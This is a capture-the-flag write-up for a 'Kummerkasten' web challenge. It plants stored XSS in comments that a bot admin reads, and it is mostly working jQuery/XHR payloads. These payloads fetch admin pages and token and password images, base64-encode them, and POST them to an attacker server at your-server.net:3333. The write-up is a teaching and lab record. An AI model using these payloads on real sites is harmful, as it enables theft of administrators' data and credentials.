# Kummerkasten

> He's still in seclusion, so he probably has a lot of time to frequently check for any new comments.

Sounds like a XSS is possible. Let's try:
```javascript
<script type="text/javascript">
$.post("http://your-server.net:3333");
</script>
```

After some minutes, you should see a request from the admin. Check the `Referer` header and open this page:
```javascript
<script type="text/javascript">
$.get("/admin/comment/f1e92de5-cdbf-461c-9e9f-5be607cfb97d", function(data) {
  $.post("http://your-server.net:3333", data);
});
</script>
```

Nice, in the navigation there is a link to `/admin/token`! Let's open it:
```javascript
<script type="text/javascript">
$.get("/admin/token", function(data) {
  $.post("http://your-server.net:3333", data);
});
</script>
```

We got trolled, there is an image :/. Now we have to get the image and send it to our server, so we base64 encode it and send it in the POST request:
```javascript
<script type="text/javascript">
// http://www.henryalgus.com/reading-binary-files-using-jquery-ajax/
function fetchBlob(uri, callback) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', uri, true);
  xhr.responseType = 'arraybuffer';

  xhr.onload = function(e) {
    if (this.status == 200) {
      var blob = this.response;
      if (callback) {
        callback(blob);
      }
    }
  };
  xhr.send();
};

// http://stackoverflow.com/a/9458996/128597
function _arrayBufferToBase64(buffer) {
    var binary = '';
    var bytes = new Uint8Array(buffer);
    var len = bytes.byteLength;
    for (var i = 0; i < len; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return window.btoa(binary);
};

fetchBlob("admin/img/token.png?20151228", function(blob) {
  $.post("http://your-server.net:3333", _arrayBufferToBase64(blob));
});
</script>
```

Unfortunately this didn't work. Either the admin (a bot of course) was down or it was because the "comment" is too long, so just minify the javascript.
Then decode the base64 data and open the png file. Looks like a token!


But it didn't work...
Next day we got a hint in the description: There are two parts of the token and we have to concatenate it.

So let's recheck the HTML code of the admin page... and we find another link to `/admin/bugs`. Let's open it:
```javascript
<script type="text/javascript">
$.get("/admin/bugs", function(data) {
  $.post("http://your-server.net:3333", data);
});
</script>
```

There is another image on this page, let's request it:
```javascript
<script type="text/javascript">
// http://www.henryalgus.com/reading-binary-files-using-jquery-ajax/
function fetchBlob(uri, callback) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', uri, true);
  xhr.responseType = 'arraybuffer';

  xhr.onload = function(e) {
    if (this.status == 200) {
      var blob = this.response;
      if (callback) {
        callback(blob);
      }
    }
  };
  xhr.send();
};

// http://stackoverflow.com/a/9458996/128597
function _arrayBufferToBase64(buffer) {
    var binary = '';
    var bytes = new Uint8Array(buffer);
    var len = bytes.byteLength;
    for (var i = 0; i < len; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return window.btoa(binary);
};

fetchBlob("admin/img/root_pw.png?20151228", function(blob) {
  $.post("http://your-server.net:3333", _arrayBufferToBase64(blob));
});
</script>
```
(Don't forget to minify the javascript source)

Same as before, decode the base64 data, save as png and open the file in an image viewer. The token is the mysql password of the production environment.

Concatenate it (first the mysql password, then the other number-only token) and you're done.
